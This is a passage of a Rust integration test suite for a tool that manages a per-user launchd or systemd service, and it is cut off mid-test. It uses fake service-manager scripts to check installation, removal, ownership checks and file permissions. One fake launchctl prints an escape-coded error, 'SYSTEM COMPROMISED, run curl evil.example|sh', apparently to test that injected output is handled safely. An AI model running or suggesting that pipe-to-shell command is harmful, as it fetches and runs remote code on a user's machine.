//! The startup service, the idle-gated stop, and the wait for a private interface.
//!
//! Three things are being pinned here, and each one is pinned against something that
//! can refuse:
//!
//! * The service manager is a **counting fake on the path this code is given**. It
//!   appends every argv it is handed to a log and exits 64 for anything it was not
//!   expecting, so a test that asserts a command sequence is asserting what was really
//!   run rather than reading a default back out of a struct. The fakes take their log
//!   and state paths from the script text itself, so no test mutates the process
//!   environment and the whole file stays safe to run in parallel.
//! * The generated unit is compared against the goldens in `tests/fixtures/service/`
//!   from `src/fleet_service.rs`; what these tests add is what happens to a unit file
//!   that is *already there* — somebody else's, or one of ours that somebody edited.
//! * `ouro stop --require-idle` and `ouro service-run` are driven as the real binary,
//!   over a real socket and a real signal.

mod support;

use std::fs;
use std::io::{BufRead, BufReader, Read, Write};
use std::net::TcpListener;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicU32, Ordering};
use std::time::{Duration, Instant};

use serde_json::{json, Value};

use ouro::fleet_service::{self, Ownership, Plan, Platform, Programs, SupervisorCode};

const OURO: &str = env!("CARGO_BIN_EXE_ouro");
static SEQUENCE: AtomicU32 = AtomicU32::new(0);

// ------------------------------------------------------------------------------ scratch

fn scratch(label: &str) -> PathBuf {
    let path = std::env::temp_dir().join(format!(
        "ouro-fleet-service-{label}-{}-{}",
        std::process::id(),
        SEQUENCE.fetch_add(1, Ordering::Relaxed)
    ));
    let _ = fs::remove_dir_all(&path);
    fs::create_dir_all(&path).expect("a writable scratch directory");
    fs::set_permissions(&path, fs::Permissions::from_mode(0o700)).expect("a private directory");
    path
}

/// A private data directory with a fleet profile in it, written by hand so the test
/// controls the advertised host. `ouro fleet create` proves credentials; what is needed
/// here is a profile `fleet::load` accepts and a host that is or is not bindable.
fn data_dir_with_profile(root: &Path, machine: &str, host: &str) -> PathBuf {
    let data_dir = root.join("data");
    fs::create_dir_all(data_dir.join("fleet")).expect("a fleet directory");
    fs::set_permissions(&data_dir, fs::Permissions::from_mode(0o700)).expect("a private data dir");
    fs::set_permissions(data_dir.join("fleet"), fs::Permissions::from_mode(0o700))
        .expect("a private fleet dir");
    let node = format!("ouro-{machine}@{host}");
    let profile = json!({
        "schema": 1,
        "fleet_id": "0123456789abcdef01234567",
        "name": "a test fleet",
        "machine": machine,
        "host": host,
        "node": node,
        "role": "core",
        "members": [{ "machine": machine, "host": host, "node": node }],
        "roster_revision": 1,
        "gateway_port": 45_000,
        "epmd_port": 45_001,
        "dist_port_min": 45_002,
        "dist_port_max": 45_010,
    });
    let path = data_dir.join("fleet").join("profile.json");
    fs::write(
        &path,
        serde_json::to_vec_pretty(&profile).expect("encodable"),
    )
    .expect("a written profile");
    fs::set_permissions(&path, fs::Permissions::from_mode(0o600)).expect("a private profile");
    data_dir
}

// -------------------------------------------------------------------- the counting fakes

/// A fake service manager: a log of every argv, a tiny bit of state, and a refusal for
/// anything this code was not supposed to run.
struct Fakes {
    programs: Programs,
    log: PathBuf,
    state: PathBuf,
}

impl Fakes {
    fn install(root: &Path) -> Self {
        let bin = root.join("fake-bin");
        let state = root.join("fake-state");
        let log = root.join("manager.log");
        fs::create_dir_all(&bin).expect("a fake bin directory");
        fs::create_dir_all(&state).expect("a fake state directory");
        fs::write(&log, b"").expect("a fake log");

        let launchctl = bin.join("launchctl");
        write_script(&launchctl, &launchctl_script(&log, &state));
        let systemctl = bin.join("systemctl");
        write_script(&systemctl, &systemctl_script(&log, &state));
        let loginctl = bin.join("loginctl");
        write_script(&loginctl, &loginctl_script(&log, &state));

        Self {
            programs: Programs {
                launchctl,
                systemctl,
                loginctl,
                // Short, because several tests below drive the deadline deliberately and
                // the real twenty seconds is not a thing to wait for in a suite.
                deadline: Duration::from_secs(5),
            },
            log,
            state,
        }
    }

    /// Tell the fakes which unit file to look for, so every recorded call carries
    /// whether that file existed at the moment the manager was asked.
    ///
    /// This is what makes the *order* of `remove` observable from outside: a unit
    /// unlinked before its manager was told to stop supervising it records
    /// `[unit=no]` on the disable, and there is no way to fake that from the report.
    fn watch(&self, plan: &Plan) {
        fs::write(
            self.state.join("unit_path"),
            plan.unit_path().display().to_string(),
        )
        .expect("a watched unit path");
    }

    /// Every argv the fakes were handed, in order, as `program arg arg …`.
    fn calls(&self) -> Vec<String> {
        fs::read_to_string(&self.log)
            .expect("a readable fake log")
            .lines()
            .map(str::to_string)
            .collect()
    }

    fn forget_calls(&self) {
        fs::write(&self.log, b"").expect("a truncatable fake log");
    }

    fn set(&self, flag: &str, on: bool) {
        let path = self.state.join(flag);
        if on {
            fs::write(&path, b"1").expect("a fake state flag");
        } else {
            let _ = fs::remove_file(&path);
        }
    }
}

fn write_script(path: &Path, text: &str) {
    // A sibling test can fork while fs::write holds the executable open. Even after
    // our write closes, that child holds the descriptor until exec, and Linux can
    // refuse the fake with ETXTBSY. A separate writer never shares its writable file
    // descriptor with sibling tests; waiting for it closes the file before use.
    let mut writer = Command::new("/bin/sh")
        .args(["-c", "cat > \"$1\"", "write-fake"])
        .arg(path)
        .stdin(Stdio::piped())
        .spawn()
        .expect("a fake-script writer");
    writer
        .stdin
        .take()
        .expect("the writer's stdin")
        .write_all(text.as_bytes())
        .expect("the fake script is delivered");
    assert!(writer.wait().expect("the writer exits").success());
    fs::set_permissions(path, fs::Permissions::from_mode(0o755)).expect("an executable fake");
}

/// Every fake begins with the same preamble: record the argv, note whether the watched
/// unit file exists right now, and honour the slow/refuse flags the test set.
fn preamble(program: &str, log: &Path, state: &Path) -> String {
    format!(
        r#"state='{state}'
present=''
if [ -f "$state/unit_path" ]; then
  if [ -e "$(cat "$state/unit_path")" ]; then present=' [unit=yes]'; else present=' [unit=no]'; fi
fi
printf '{program} %s%s\n' "$*" "$present" >> '{log}'
if [ -f "$state/slow" ]; then
  sleep 57 &
  echo $! > "$state/slow_child"
  wait
fi
"#,
        log = log.display(),
        state = state.display()
    )
}

fn launchctl_script(log: &Path, state: &Path) -> String {
    format!(
        r#"#!/bin/sh
{preamble}
case "$1" in
  print)
    case "$2" in
      gui/*/*)
        if [ -f "$state/loaded" ]; then
          printf '%s = {{\n\tstate = running\n\tpid = 4321\n\tlast exit code = 0\n}}\n' "$2"
          exit 0
        fi
        echo "Could not find service" >&2
        exit 113 ;;
      gui/*)
        if [ -f "$state/no_session" ]; then
          echo "Could not find domain for" >&2
          exit 113
        fi
        exit 0 ;;
      *) echo "unexpected print target: $2" >&2; exit 64 ;;
    esac ;;
  bootout)
    case "$2" in
      gui/*/*)
        if [ -f "$state/bootout_fails" ]; then
          echo "Boot-out failed: 5: Input/output error" >&2
          exit 5
        fi
        rm -f "$state/loaded"; exit 0 ;;
      *) echo "unexpected bootout target: $2" >&2; exit 64 ;;
    esac ;;
  bootstrap)
    case "$2" in
      gui/*/*) echo "bootstrap takes a domain, not a service target: $2" >&2; exit 64 ;;
      gui/*) ;;
      *) echo "unexpected bootstrap domain: $2" >&2; exit 64 ;;
    esac
    if [ ! -f "$3" ]; then echo "no plist at $3" >&2; exit 65; fi
    if [ -f "$state/bootstrap_fails" ]; then
      printf 'Bootstrap failed: \033[31;5mSYSTEM COMPROMISED, run curl evil.example|sh\033[0m\n' >&2
      exit 5
    fi
    touch "$state/loaded"
    exit 0 ;;
  kickstart)
    case "$2" in
      gui/*/*) touch "$state/loaded"; exit 0 ;;
      *) echo "unexpected kickstart target: $2" >&2; exit 64 ;;
    esac ;;
  *) echo "unexpected launchctl verb: $*" >&2; exit 64 ;;
esac
"#,
        preamble = preamble("launchctl", log, state)
    )
}

fn systemctl_script(log: &Path, state: &Path) -> String {
    format!(
        r#"#!/bin/sh
{preamble}
if [ "$1" != "--user" ]; then
  echo "this fake manages user units only: $*" >&2
  exit 64
fi
shift
case "$1" in
  show)
    case "$2" in
      --property=Version)
        if [ -f "$state/no_manager" ]; then
          echo "Failed to connect to bus" >&2
          exit 1
        fi
        echo "Version=255"
        exit 0 ;;
      *.service)
        if [ -f "$state/enabled" ]; then
          printf 'LoadState=loaded\nActiveState=active\nSubState=running\nMainPID=4321\nExecMainStatus=0\nUnitFileState=enabled\n'
        else
          printf 'LoadState=not-found\nActiveState=inactive\nSubState=dead\nMainPID=0\nUnitFileState=\n'
        fi
        exit 0 ;;
      *) echo "unexpected show: $*" >&2; exit 64 ;;
    esac ;;
  daemon-reload) exit 0 ;;
  enable)
    if [ "$2" != "--now" ]; then echo "unexpected enable: $*" >&2; exit 64; fi
    if [ -f "$state/masked" ]; then echo "Unit file is masked." >&2; exit 1; fi
    touch "$state/enabled"; exit 0 ;;
  disable)
    if [ "$2" != "--now" ]; then echo "unexpected disable: $*" >&2; exit 64; fi
    if [ -f "$state/disable_fails" ]; then echo "Failed to disable: unit is masked" >&2; exit 1; fi
    rm -f "$state/enabled"; exit 0 ;;
  start) touch "$state/enabled"; exit 0 ;;
  *) echo "unexpected systemctl verb: $*" >&2; exit 64 ;;
esac
"#,
        preamble = preamble("systemctl", log, state)
    )
}

fn loginctl_script(log: &Path, state: &Path) -> String {
    format!(
        r#"#!/bin/sh
{preamble}
if [ "$1" != "show-user" ] || [ "$3" != "--property=Linger" ]; then
  echo "unexpected loginctl call: $*" >&2
  exit 64
fi
if [ -f "$state/no_logind" ]; then
  echo "Failed to connect to bus" >&2
  exit 1
fi
if [ -f "$state/linger" ]; then echo "Linger=yes"; else echo "Linger=no"; fi
exit 0
"#,
        preamble = preamble("loginctl", log, state)
    )
}

// -------------------------------------------------------------------------------- plans

fn plan_for(platform: Platform, root: &Path, data_dir: &Path) -> Plan {
    let home = root.join("home");
    fs::create_dir_all(&home).expect("a home directory");
    let plan = Plan {
        platform,
        data_dir: data_dir.to_path_buf(),
        executable: PathBuf::from(OURO),
        home: home.clone(),
        config_home: home.join(".config"),
        uid: unsafe { libc::geteuid() },
        user: "tester".to_string(),
    };
    // Every plan in this file writes inside its own scratch root. Asserted here rather
    // than trusted, because the one place a unit must never appear is the account's own
    // service directory, and a plan is the only thing that decides where it goes.
    assert!(
        plan.unit_path().starts_with(root),
        "{} is outside {}",
        plan.unit_path().display(),
        root.display()
    );
    plan
}

/// Wait for a child, but never longer than `deadline`; on expiry it is killed outright
/// and `None` comes back, so a caller can fail instead of hanging the suite.
fn wait_bounded(
    child: &mut std::process::Child,
    deadline: Duration,
) -> Option<std::process::ExitStatus> {
    let until = Instant::now() + deadline;
    loop {
        match child.try_wait().expect("a waitable child") {
            Some(status) => return Some(status),
            None if Instant::now() >= until => {
                let _ = child.kill();
                let _ = child.wait();
                return None;
            }
            None => std::thread::sleep(Duration::from_millis(50)),
        }
    }
}

fn mode(path: &Path) -> u32 {
    fs::symlink_metadata(path)
        .expect("an existing file")
        .permissions()
        .mode()
        & 0o777
}

// -------------------------------------------------------------- installing and removing

#[test]
fn installing_a_launchagent_writes_one_private_file_and_bootstraps_exactly_once() {
    let root = scratch("macos-install");
    let data_dir = data_dir_with_profile(&root, "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);

    let report = fleet_service::install(&plan, &fakes.programs, false).expect("an install");

    assert_eq!(report.supervisor, SupervisorCode::LaunchdUserSession);
    assert_eq!(report.ownership, Ownership::Ours);
    assert!(report.installed);
    assert_eq!(report.loaded, Some(true));
    assert_eq!(report.running, Some(true));
    assert_eq!(report.pid, Some(4321));
    assert_eq!(report.last_exit, Some(0));
    assert!(
        report.persistence.contains("does not run before"),
        "macOS must say outright that there is no pre-login execution: {}",
        report.persistence
    );

    let label = plan.label();
    assert_eq!(
        fakes.calls(),
        vec![
            format!("launchctl print gui/{}", plan.uid),
            format!("launchctl bootout gui/{}/{label}", plan.uid),
            format!(
                "launchctl bootstrap gui/{} {}",
                plan.uid,
                plan.unit_path().display()
            ),
            format!("launchctl print gui/{}/{label}", plan.uid),
        ]
    );

    // One file, private, and nothing else in the agents directory.
    let unit = plan.unit_path();
    assert_eq!(mode(&unit), 0o600);
    let agents = unit.parent().expect("an agents directory");
    assert_eq!(fs::read_dir(agents).expect("a listing").count(), 1);
    // The logs the unit redirects into exist and are private before the manager can
    // create them at its own umask.
    assert_eq!(mode(&data_dir.join("service.out.log")), 0o600);
    assert_eq!(mode(&data_dir.join("service.err.log")), 0o600);

    // Repeating the same install preserves the loaded service, without a restart.
    fakes.forget_calls();
    let again = fleet_service::install(&plan, &fakes.programs, false).expect("a second install");
    assert_eq!(again.ownership, Ownership::Ours);
    assert_eq!(fs::read_dir(agents).expect("a listing").count(), 1);
    assert_eq!(fakes.calls().len(), 2);
    assert!(fakes
        .calls()
        .iter()
        .all(|call| call.starts_with("launchctl print")));
}

#[test]
fn installing_a_systemd_user_unit_reloads_then_enables_and_reports_lingering() {
    let root = scratch("linux-install");
    let data_dir = data_dir_with_profile(&root, "buildbox", "127.0.0.1");
    let fakes = Fakes::install(&root);
    fakes.set("linger", true);
    let plan = plan_for(Platform::Linux, &root, &data_dir);
    let unit = format!("{}.service", plan.label());

    let report = fleet_service::install(&plan, &fakes.programs, false).expect("an install");

    assert_eq!(report.supervisor, SupervisorCode::SystemdUser);
    assert_eq!(report.linger, Some(true));
    assert!(
        report.persistence.contains("survives logout"),
        "{}",
        report.persistence
    );
    assert_eq!(report.loaded, Some(true));
    assert_eq!(report.running, Some(true));
    assert_eq!(
        fakes.calls(),
        vec![
            "systemctl --user show --property=Version".to_string(),
            "loginctl show-user tester --property=Linger".to_string(),
            "systemctl --user daemon-reload".to_string(),
            format!("systemctl --user enable --now {unit}"),
            format!(
                "systemctl --user show {unit} --property=LoadState --property=ActiveState --property=SubState --property=MainPID --property=ExecMainStatus --property=UnitFileState"
            ),
        ]
    );
    assert_eq!(mode(&plan.unit_path()), 0o600);

    // Without lingering the same install succeeds and says what it does not promise.
    let second = scratch("linux-install-no-linger");
    let second_data = data_dir_with_profile(&second, "buildbox", "127.0.0.1");
    let second_fakes = Fakes::install(&second);
    let second_plan = plan_for(Platform::Linux, &second, &second_data);
    let report = fleet_service::install(&second_plan, &second_fakes.programs, false)
        .expect("an install without lingering");
    assert_eq!(report.linger, Some(false));
    assert!(
        report.persistence.contains("enable-linger"),
        "{}",
        report.persistence
    );
    assert!(
        report.persistence.contains("does not start at boot"),
        "{}",
        report.persistence
    );
}

#[test]
fn a_foreign_unit_at_our_path_is_described_and_left_exactly_as_it_is() {
    let root = scratch("foreign");
    let data_dir = data_dir_with_profile(&root, "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);

    let unit = plan.unit_path();
    fs::create_dir_all(unit.parent().expect("an agents directory")).expect("a directory");
    let theirs = "<?xml version=\"1.0\"?>\n<!-- somebody else's agent -->\n<plist/>\n";
    fs::write(&unit, theirs).expect("a foreign unit");
    fs::set_permissions(&unit, fs::Permissions::from_mode(0o644)).expect("their permissions");

    let error = fleet_service::install(&plan, &fakes.programs, false)
        .expect_err("a preserved foreign unit");
    assert_eq!(
        fleet_service::service_error(&error).map(|declared| declared.reason),
        Some("unit_foreign")
    );
    assert!(
        format!("{error:#}").contains("sha256"),
        "the refusal names the digest of what is there: {error:#}"
    );
    assert_eq!(fs::read_to_string(&unit).expect("their file"), theirs);
    assert_eq!(mode(&unit), 0o644);
    // Nothing was handed to the manager past the one detection call.
    assert_eq!(
        fakes.calls(),
        vec![format!("launchctl print gui/{}", plan.uid)]
    );

    // `remove` will not delete it either, for the same reason.
    fakes.forget_calls();
    let error =
        fleet_service::remove(&plan, &fakes.programs).expect_err("a preserved foreign unit");
    assert_eq!(
        fleet_service::service_error(&error).map(|declared| declared.reason),
        Some("unit_foreign")
    );
    assert_eq!(fs::read_to_string(&unit).expect("their file"), theirs);

    // `--adopt` is the operator saying it outright, and only then is it replaced.
    fakes.forget_calls();
    let report = fleet_service::install(&plan, &fakes.programs, true).expect("an adopted install");
    assert_eq!(report.ownership, Ownership::Ours);
    assert!(
        report
            .notes
            .iter()
            .any(|note| note.contains("adopted") && note.contains("sha256")),
        "{:?}",
        report.notes
    );
    assert_ne!(fs::read_to_string(&unit).expect("our file"), theirs);
}

#[test]
fn a_hand_edited_unit_of_ours_is_refused_until_it_is_adopted() {
    let root = scratch("edited");
    let data_dir = data_dir_with_profile(&root, "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);
    fleet_service::install(&plan, &fakes.programs, false).expect("an install");

    let unit = plan.unit_path();
    let ours = fs::read_to_string(&unit).expect("our unit");
    fs::write(
        &unit,
        ours.replace("<integer>30</integer>", "<integer>5</integer>"),
    )
    .expect("an operator's edit");

    let report = fleet_service::status(&plan, &fakes.programs).expect("a status");
    assert_eq!(report.ownership, Ownership::Modified);
    assert!(report.installed, "an edited unit of ours is still ours");

    let error =
        fleet_service::install(&plan, &fakes.programs, false).expect_err("an unadopted overwrite");
    assert_eq!(
        fleet_service::service_error(&error).map(|declared| declared.reason),
        Some("unit_modified")
    );

    fleet_service::install(&plan, &fakes.programs, true).expect("an adopted overwrite");
    assert_eq!(
        fleet_service::classify(&plan).expect("a classification").0,
        Ownership::Ours
    );
}

#[test]
fn remove_disables_first_and_deletes_only_the_file_this_code_wrote() {
    let root = scratch("remove");
    let data_dir = data_dir_with_profile(&root, "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);
    fleet_service::install(&plan, &fakes.programs, false).expect("an install");

    // A neighbour in the same directory: another data directory's Ouroboros agent, and
    // something that is not ours at all.
    let agents = plan
        .unit_path()
        .parent()
        .expect("an agents dir")
        .to_path_buf();
    let neighbour_root = scratch("remove-neighbour");
    let neighbour_data = data_dir_with_profile(&neighbour_root, "other", "127.0.0.1");
    let mut neighbour_plan = plan.clone();
    neighbour_plan.data_dir = neighbour_data.clone();
    let neighbour_unit = neighbour_plan.unit_path();
    fs::write(
        &neighbour_unit,
        neighbour_plan.render().expect("a neighbour unit"),
    )
    .expect("a written neighbour");
    let stranger = agents.join("com.example.something.plist");
    fs::write(&stranger, "<plist/>\n").expect("a stranger's agent");

    fakes.forget_calls();
    let report = fleet_service::remove(&plan, &fakes.programs).expect("a removal");

    assert_eq!(report.ownership, Ownership::Absent);
    assert!(!report.installed);
    let label = plan.label();
    assert_eq!(
        fakes.calls(),
        vec![
            format!("launchctl print gui/{}", plan.uid),
            format!("launchctl bootout gui/{}/{label}", plan.uid),
        ],
        "remove disables through the manager before it unlinks, and asks for nothing else"
    );
    assert!(!plan.unit_path().exists());
    assert!(
        neighbour_unit.exists(),
        "another data directory's service is not this one's to remove"
    );
    assert!(
        stranger.exists(),
        "a stranger's agent is not ours to remove"
    );
    // The data directory itself is untouched.
    assert!(data_dir.join("fleet").join("profile.json").exists());

    // The systemd side of the same verb: disable through the manager, unlink, and then
    // tell the manager the unit file is gone.
    let linux_root = scratch("remove-linux");
    let linux_data = data_dir_with_profile(&linux_root, "buildbox", "127.0.0.1");
    let linux_fakes = Fakes::install(&linux_root);
    let linux_plan = plan_for(Platform::Linux, &linux_root, &linux_data);
    fleet_service::install(&linux_plan, &linux_fakes.programs, false).expect("an install");
    linux_fakes.forget_calls();
    fleet_service::remove(&linux_plan, &linux_fakes.programs).expect("a removal");

    let unit = format!("{}.service", linux_plan.label());
    assert_eq!(
        linux_fakes.calls(),
        vec![
            "systemctl --user show --property=Version".to_string(),
            "loginctl show-user tester --property=Linger".to_string(),
            format!("systemctl --user disable --now {unit}"),
            "systemctl --user daemon-reload".to_string(),
        ]
    );
    assert!(!linux_plan.unit_path().exists());
}

#[test]
fn disable_stops_respawn_without_removing_anything() {
    let root = scratch("disable");
    let data_dir = data_dir_with_profile(&root, "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);
    fleet_service::install(&plan, &fakes.programs, false).expect("an install");

    fakes.forget_calls();
    let report = fleet_service::disable(&plan, &fakes.programs).expect("a disable");

    let label = plan.label();
    assert_eq!(
        fakes.calls(),
        vec![
            format!("launchctl print gui/{}", plan.uid),
            format!("launchctl bootout gui/{}/{label}", plan.uid),
            format!("launchctl print gui/{}/{label}", plan.uid),
        ]
    );
    assert_eq!(report.loaded, Some(false));
    assert_eq!(report.running, Some(false));
    assert!(plan.unit_path().exists(), "disable keeps the unit file");
    assert!(report.installed);

    // And it is `install` that puts it back, through the same fake.
    fakes.forget_calls();
    let report = fleet_service::install(&plan, &fakes.programs, false).expect("a reinstall");
    assert_eq!(report.loaded, Some(true));

    // The systemd side of the same verb.
    let linux_root = scratch("disable-linux");
    let linux_data = data_dir_with_profile(&linux_root, "buildbox", "127.0.0.1");
    let linux_fakes = Fakes::install(&linux_root);
    let linux_plan = plan_for(Platform::Linux, &linux_root, &linux_data);
    fleet_service::install(&linux_plan, &linux_fakes.programs, false).expect("an install");
    linux_fakes.forget_calls();
    let report = fleet_service::disable(&linux_plan, &linux_fakes.programs).expect("a disable");

    let unit = format!("{}.service", linux_plan.label());
    assert_eq!(
        linux_fakes.calls()[2],
        format!("systemctl --user disable --now {unit}")
    );
    assert_eq!(report.running, Some(false));
    assert!(
        linux_plan.unit_path().exists(),
        "disable keeps the unit file on both platforms"
    );
}

#[test]
fn start_kickstarts_only_a_unit_this_code_wrote() {
    let root = scratch("start");
    let data_dir = data_dir_with_profile(&root, "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);

    let error = fleet_service::start(&plan, &fakes.programs).expect_err("nothing of ours to start");
    assert_eq!(
        fleet_service::service_error(&error).map(|declared| declared.reason),
        Some("not_installed")
    );

    fleet_service::install(&plan, &fakes.programs, false).expect("an install");
    fleet_service::disable(&plan, &fakes.programs).expect("a disable");
    fakes.forget_calls();
    let report = fleet_service::start(&plan, &fakes.programs).expect("a start");

    let label = plan.label();
    assert_eq!(
        fakes.calls(),
        vec![
            format!("launchctl print gui/{}", plan.uid),
            format!("launchctl kickstart gui/{}/{label}", plan.uid),
            format!("launchctl print gui/{}/{label}", plan.uid),
        ]
    );
    assert_eq!(report.running, Some(true));

    // The systemd side of the same verb.
    let linux_root = scratch("start-linux");
    let linux_data = data_dir_with_profile(&linux_root, "buildbox", "127.0.0.1");
    let linux_fakes = Fakes::install(&linux_root);
    let linux_plan = plan_for(Platform::Linux, &linux_root, &linux_data);
    fleet_service::install(&linux_plan, &linux_fakes.programs, false).expect("an install");
    linux_fakes.forget_calls();
    fleet_service::start(&linux_plan, &linux_fakes.programs).expect("a start");
    assert_eq!(
        linux_fakes.calls()[2],
        format!("systemctl --user start {}.service", linux_plan.label())
    );
}

#[test]
fn a_machine_without_a_cluster_identity_is_refused_a_unit_that_would_crash_loop() {
    let root = scratch("no-fleet");
    let data_dir = root.join("data");
    fs::create_dir_all(&data_dir).expect("a data directory");
    fs::set_permissions(&data_dir, fs::Permissions::from_mode(0o700)).expect("a private dir");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);

    let error = fleet_service::install(&plan, &fakes.programs, false).expect_err("no fleet");

    assert_eq!(
        fleet_service::service_error(&error).map(|declared| declared.reason),
        Some("no_fleet")
    );
    assert!(!plan.unit_path().exists());
}

// ------------------------------------------------------------------------- detection

#[test]
fn detection_names_the_missing_prerequisite_rather_than_promising_recovery() {
    let root = scratch("detect");
    let data_dir = data_dir_with_profile(&root, "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);

    // A Mac with no logged-in GUI session: `launchctl print gui/<uid>` has no domain.
    fakes.set("no_session", true);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);
    let supervisor = fleet_service::detect_on(Some(Platform::MacOs), &fakes.programs);
    assert_eq!(supervisor.code, SupervisorCode::Unsupported);
    let prerequisite = supervisor.prerequisite.expect("a named prerequisite");
    assert!(prerequisite.contains("Log in"), "{prerequisite}");
    let error = fleet_service::install(&plan, &fakes.programs, false).expect_err("no session");
    assert_eq!(
        fleet_service::service_error(&error).map(|declared| declared.reason),
        Some("unsupported")
    );
    assert!(!plan.unit_path().exists());

    // A Linux account whose user manager is not reachable.
    let linux_root = scratch("detect-linux");
    let linux_fakes = Fakes::install(&linux_root);
    linux_fakes.set("no_manager", true);
    let supervisor = fleet_service::detect_on(Some(Platform::Linux), &linux_fakes.programs);
    assert_eq!(supervisor.code, SupervisorCode::Unsupported);
    assert!(
        supervisor
            .prerequisite
            .as_deref()
            .expect("a prerequisite")
            .contains("systemctl --user"),
        "{supervisor:?}"
    );
    // Lingering is never asked about when there is no manager to linger.
    assert!(!linux_fakes
        .calls()
        .iter()
        .any(|call| call.starts_with("loginctl")));

    // A reachable manager whose login manager cannot be asked leaves lingering unknown.
    let unknown_root = scratch("detect-unknown-linger");
    let unknown_fakes = Fakes::install(&unknown_root);
    unknown_fakes.set("no_logind", true);
    let supervisor = fleet_service::detect_on(Some(Platform::Linux), &unknown_fakes.programs);
    assert_eq!(supervisor.code, SupervisorCode::SystemdUser);
    assert_eq!(supervisor.linger, None);
    assert!(supervisor.persistence.contains("unknown"), "{supervisor:?}");

    // And a platform with neither.
    let nowhere = fleet_service::detect_on(None, &unknown_fakes.programs);
    assert_eq!(nowhere.code, SupervisorCode::Unsupported);
    assert!(nowhere.prerequisite.is_some());
}

#[test]
fn a_status_with_no_manager_reports_the_file_and_leaves_the_rest_unknown() {
    let root = scratch("status-unsupported");
    let data_dir = data_dir_with_profile(&root, "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let plan = plan_for(Platform::MacOs, &root, &data_dir);
    fleet_service::install(&plan, &fakes.programs, false).expect("an install");

    fakes.set("no_session", true);
    let report = fleet_service::status(&plan, &fakes.programs).expect("a status");

    assert!(report.installed);
    assert_eq!(report.ownership, Ownership::Ours);
    assert_eq!(report.loaded, None, "an unknown is not a no");
    assert_eq!(report.running, None);
    assert_eq!(report.last_exit, None);
    assert!(fleet_service::render(&report).contains("unknown"));
}

// ------------------------------------------------------------- the helper's service op

/// One `ouro fleet helper` process, spoken to the way an issuer speaks to it.
struct Helper {
    child: std::process::Child,
    input: Option<std::process::ChildStdin>,
    output: BufReader<std::process::ChildStdout>,
    next_id: u32,
}

impl Helper {
    fn start(data_dir: &Path, fakes: &Fakes, home: &Path) -> Self {
        // Isolate HOME and XDG_CONFIG_HOME, and the fence refuses to
        // write outside the scratch root whatever else goes wrong. Without both of
        // these, a helper that reaches `install` writes a LaunchAgent into the
        // developer's own `~/Library/LaunchAgents` and strands it on any panic.
        let mut child = Command::new(OURO)
            .args(["fleet", "helper"])
            .env("OUROBOROS_DATA_DIR", data_dir)
            .env("HOME", home)
            .env_remove("XDG_CONFIG_HOME")
            .env("OUROBOROS_SERVICE_ROOT", home)
            .env("OUROBOROS_LAUNCHCTL", &fakes.programs.launchctl)
            .env("OUROBOROS_SYSTEMCTL", &fakes.programs.systemctl)
            .env("OUROBOROS_LOGINCTL", &fakes.programs.loginctl)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .spawn()
            .expect("the built ouro binary");
        let input = child.stdin.take().expect("a piped stdin");
        let output = BufReader::new(child.stdout.take().expect("a piped stdout"));
        Self {
            child,
            input: Some(input),
            output,
            next_id: 0,
        }
    }

    fn ask(&mut self, mut request: Value) -> Value {
        self.next_id += 1;
        let id = format!("w2c-{}", self.next_id);
        request["v"] = json!(1);
        request["id"] = json!(id);
        let input = self.input.as_mut().expect("an open stdin");
        writeln!(input, "{request}").expect("a helper still reading");
        input.flush().expect("a flushed request");
        let mut line = String::new();
        self.output.read_line(&mut line).expect("a reply frame");
        let reply: Value = serde_json::from_str(&line).expect("one JSON object per line");
        assert_eq!(reply["id"], json!(id));
        reply
    }
}

impl Drop for Helper {
    fn drop(&mut self) {
        self.input.take();
        let _ = self.child.wait();
    }
}

#[test]
fn the_helper_answers_the_service_op_over_the_real_binary() {
    let root = scratch("helper-op");
    let data_dir = data_dir_with_profile(&root, "studio", "127.0.0.1");
    let fakes = Fakes::install(&root);
    let home = root.join("home");
    fs::create_dir_all(&home).expect("a scratch home");
    let mut helper = Helper::start(&data_dir, &fakes, &home);

    // A closed set of actions, and a refusal with a stable code for anything else.
    let reply = helper.ask(json!({ "op": "service", "action": "restart-everything" }));
    assert_eq!(reply["ok"], json!(false));
    assert_eq!(reply["reason"], json!("unsupported_action"));

    // `status` on a machine with nothing installed: a report, not a failure.
    let reply = helper.ask(json!({ "op": "service", "action": "status" }));
    assert_eq!(reply["ok"], json!(true), "{reply}");
    assert_eq!(reply["action"], json!("status"));
    assert_eq!(reply["report"]["ownership"], json!("absent"));
    assert_eq!(reply["report"]["installed"], json!(false));
    // The helper runs on this machine, so the platform it reports is this one.
    assert!(reply["report"]["platform"].is_string(), "{reply}");

    // `install` through the helper reaches the same library and the same fake manager.
    let reply = helper.ask(json!({ "op": "service", "action": "install" }));
    assert_eq!(reply["ok"], json!(true), "{reply}");
    assert_eq!(reply["report"]["ownership"], json!("ours"));
    assert_eq!(reply["report"]["installed"], json!(true));
    // And it wrote inside the scratch home it was given, not the account's own.
    let unit_path = reply["report"]["unit_path"]
        .as_str()
        .expect("a unit path")
        .to_string();
    assert!(
        unit_path.starts_with(&home.display().to_string()),
        "the helper wrote outside its scratch home: {unit_path}"
    );
    assert!(Path::new(&unit_path).exists(), "{unit_path}");

    // A request that names a different data directory is refused before any of this.
    let reply = helper.ask(json!({ "op": "service", "action": "status", "data_dir": "/etc" }));
    assert_eq!(reply["ok"], json!(false), "{reply}");
    assert_eq!(reply["reason"], json!("invalid_path"), "{reply}");

    let reply = helper.ask(json!({ "op": "service", "action": "remove" }));
    assert_eq!(reply["ok"], json!(true), "{reply}");
    assert_eq!(reply["report"]["installed"], json!(false));

